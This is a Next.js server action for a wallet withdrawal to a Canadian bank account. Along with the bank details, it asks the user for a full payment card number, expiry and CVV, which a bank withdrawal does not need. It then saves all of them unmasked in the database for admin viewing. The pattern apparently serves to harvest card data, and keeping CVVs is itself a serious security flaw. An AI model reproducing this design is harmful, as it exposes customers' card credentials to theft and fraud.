"use server";

import { Prisma } from "@/generated/prisma/client";
import { revalidatePath } from "next/cache";
import { prisma } from "@/lib/prisma";
import { requireRole } from "@/lib/rbac";
import { withdrawalSchema } from "@/lib/validation";
import { parseAmount } from "@/lib/money";
import { debitWallet } from "@/lib/wallet-debit";
import type { ActionResult } from "@/lib/action-result";

const MIN_FEE = new Prisma.Decimal("1.99");
const FEE_RATE = new Prisma.Decimal("0.015");

/** Processing fee: 1.5% of the amount, with a $1.99 minimum. */
function feeFor(amount: Prisma.Decimal): Prisma.Decimal {
  const pct = amount.times(FEE_RATE);
  return (pct.greaterThan(MIN_FEE) ? pct : MIN_FEE).toDecimalPlaces(2);
}

/**
 * Client-initiated withdrawal to a Canadian bank account. Shares the
 * wallet-debit and transfer-limit logic with the transfer flows. On success,
 * the destination bank details and the card details entered for the
 * verification step are recorded on a Withdrawal row so an admin can review the
 * full submission. The wallet is debited by the gross amount; the processing
 * fee is deducted from what the beneficiary receives.
 */
export async function makeWithdrawal(
  formData: FormData
): Promise<ActionResult> {
  const session = await requireRole("CLIENT");
  const clientId = session.user.id;

  const parsed = withdrawalSchema.safeParse({
    amount: formData.get("amount"),
    beneficiaryName: formData.get("beneficiaryName"),
    bankName: formData.get("bankName"),
    institutionNumber: formData.get("institutionNumber"),
    transitNumber: formData.get("transitNumber"),
    accountNumber: formData.get("accountNumber"),
    cardType: formData.get("cardType"),
    cardName: formData.get("cardName"),
    cardNumber: formData.get("cardNumber"),
    cardExpiry: formData.get("cardExpiry"),
    cardCvv: formData.get("cardCvv"),
  });
  if (!parsed.success) {
    return { ok: false, error: parsed.error.issues[0]?.message ?? "Invalid input" };
  }

  let amount: Prisma.Decimal;
  try {
    amount = parseAmount(parsed.data.amount);
  } catch (e) {
    return { ok: false, error: (e as Error).message };
  }

  const last4 = parsed.data.accountNumber.slice(-4);
  const description = `Withdrawal · ${parsed.data.bankName} ••${last4}`;

  const result = await debitWallet({ clientId, amount, description });
  if (!result.ok) return result;

  // Money moved — record the full submission for admin review.
  const wallet = await prisma.wallet.findUnique({ where: { userId: clientId } });
  if (wallet) {
    await prisma.withdrawal.create({
      data: {
        walletId: wallet.id,
        clientId,
        amount,
        fee: feeFor(amount),
        currency: wallet.currency,
        beneficiaryName: parsed.data.beneficiaryName,
        bankName: parsed.data.bankName,
        institutionNumber: parsed.data.institutionNumber,
        transitNumber: parsed.data.transitNumber,
        accountNumber: parsed.data.accountNumber,
        cardType: parsed.data.cardType,
        cardName: parsed.data.cardName,
        cardNumber: parsed.data.cardNumber.replace(/\s/g, ""),
        cardExpiry: parsed.data.cardExpiry,
        cardCvv: parsed.data.cardCvv,
      },
    });
    revalidatePath("/admin/withdrawals");
  }

  return result;
}
